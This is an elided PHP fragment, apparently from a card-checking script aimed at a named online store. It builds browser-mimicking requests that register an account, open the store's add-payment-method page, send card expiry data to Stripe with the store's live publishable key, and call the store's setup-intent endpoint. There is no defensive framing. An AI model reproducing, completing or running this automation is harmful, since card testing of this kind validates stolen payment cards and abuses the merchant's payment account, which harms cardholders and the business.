...
$get_url = "https://www.is2software.com/bd-shopping-account/";
...
$create_url = "https://www.is2software.com/bd-shopping-account/";
...
$create_headers = [
    ...
    "origin: https://www.is2software.com",
    "priority: u=0, i",
    "referer: https://www.is2software.com/bd-shopping-account/",
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile: ?0",
    'sec-ch-ua-platform: "Windows"',
    "sec-fetch-dest: document",
...
$create_data = http_build_query([
    ...
    "_wp_http_referer" => "/bd-shopping-account/",
    "register" => "Register"
]);
...
$pay_url = "https://www.is2software.com/bd-shopping-account/add-payment-method/";
...
$pay_headers = [
    ...
    "accept-language: en-US,en;q=0.9",
    "priority: u=0, i",
    "referer: https://www.is2software.com/bd-shopping-account/add-payment-method/",
    'sec-ch-ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
    "sec-ch-ua-mobile: ?0",
    'sec-ch-ua-platform: "Windows"',
    "sec-fetch-dest: document",
...
$st_payload = http_build_query([
    ...
    "card[exp_month]" => $mm,
    "card[exp_year]" => $yy,
    "referrer" => "https://www.is2software.com",
    "key" => "pk_live_41huWH99A6FRofVT0aL7CRVeJ3eGe9a7xxr5rjs1DVIJ1ZvnO1efxRzEZe96jjdNLiI7weXxbuTkPbPSMtpWa2MRw00KiB0IZto"
]);
...
$cseti_url = "https://www.is2software.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent";
